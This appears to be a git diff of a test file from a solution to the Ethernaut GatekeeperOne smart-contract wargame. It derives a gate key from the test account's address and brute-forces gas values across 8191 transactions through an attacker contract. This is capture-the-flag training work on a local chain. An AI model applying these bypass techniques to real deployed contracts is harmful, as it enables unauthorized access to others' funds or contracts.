@@ -8,7 +8,7 @@ const { solidity } = require("ethereum-waffle")
 chai.use(solidity)
 
 
-describe.only("Challenge 13 - GatekeeperOne", function () {
+describe("Challenge 13 - GatekeeperOne", function () {
     let ethernaut
     let level
     let instance
@@ -50,47 +50,43 @@ describe.only("Challenge 13 - GatekeeperOne", function () {
                 left in our transaction. Specifically the gas left mod 8191 has to be zero.
                 
                 Solution: Since (in my case) these tests are being ran on a local blockchain,
-                I will send in 8191 transactions increasing gas by one each time. One of
-                those will 8191 mod to zero.
+                I will send in 8191 transactions increasing gas by one each time. I will note
+                for the first one that has  gas used mod 8191 to equal zero.
 
             Gate three: We have to find a value that has some specific properties when
             converted to and from lower and higher types. Specifics below
-            require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
-            require(uint32(uint64(_gateKey)) != uint64(_gateKey));
-            require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));
+            Part1: require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
+            Part2: require(uint32(uint64(_gateKey)) != uint64(_gateKey));
+            Part3: require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));
 
-                Solution: Main thing to notice here is that key itself is bytes8
-                type and all of the comparisons are uint types.
-                This is important because with uints, when converting from
-                higher type to lower type we lose higher order bits
-                e.g. if we move from uint32 0X12345678 to uint16, we will get
-                0x5678. Going from lower to higher types we pad to left.
-                e.g. uint16 0x1234 becomes uint32 0x00001234.
-                Following these rules we will come up with a value that will
-                satisfy the last gate
-            
+                Solution: Take our EOA and start from part 3 and work our way to part 1
+                EOA: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
+                Part 3: uint16 of our EOA equals 0x2266. uint32 of that is 0x00002266
+                Part 2: uint64 cannot be 0x0000000000002266, so lets chose 0x1000000000002266
+                part 1: already satisfied from part 3 above
+                final key: 0x1000000000002266            
         */
         it("open all gates", async function () {
-            const numOfLoops = 8191 //1443
+            const numOfLoops = 8191
             const maliciousContract = await GatekeeperOneAttacker.new(instance.address)
-            const key = "..."
-            const initialGas = 100000
+            const initialGas = 100000 //opened with gas: 101408
+            const key = "0x1000000000002266"
 
+            //await maliciousContract.openAllGates({gas:initialGas})
             for (let i = 0; i <= numOfLoops; i++) {
                 const options = { gas: initialGas + i }
 
                 try {
                     const isOpened = await maliciousContract.openAllGates(key, options)
-                    console.log("asdf", isOpened);
-                    // if (isOpened) {
-                    //     console.log(`opened with gas: ${initialGas + i}`)
-                    //     break
-                    //}
+                    if (isOpened) {
+                        //console.log(`opened with gas: ${initialGas + i}`)
+                        break
+                    }                    
                 } catch (err) {
-                    if (err.toString().indexOf("two") === 79) {
-                        process.stdout.write(`${i}`)
+                    if (err.toString().indexOf("GatekeeperOne") === -1) {
+                        //process.stdout.write(`${i}`)
                     } else {
-                        process.stdout.write(`${err} `)
+                        //process.stdout.write(`${err} `)
                     }
                 }
             }
